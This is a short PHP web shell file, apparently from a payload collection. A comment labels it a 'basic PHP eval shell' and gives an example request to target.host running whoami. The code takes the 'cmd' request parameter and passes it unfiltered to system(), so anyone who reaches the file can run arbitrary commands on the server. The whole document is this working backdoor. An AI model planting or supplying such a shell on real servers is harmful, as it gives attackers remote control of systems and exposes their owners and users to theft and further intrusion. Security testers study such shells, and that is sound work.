<!-- basic PHP eval shell. http://target.host/php-eval.php?cmd=whoami   -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

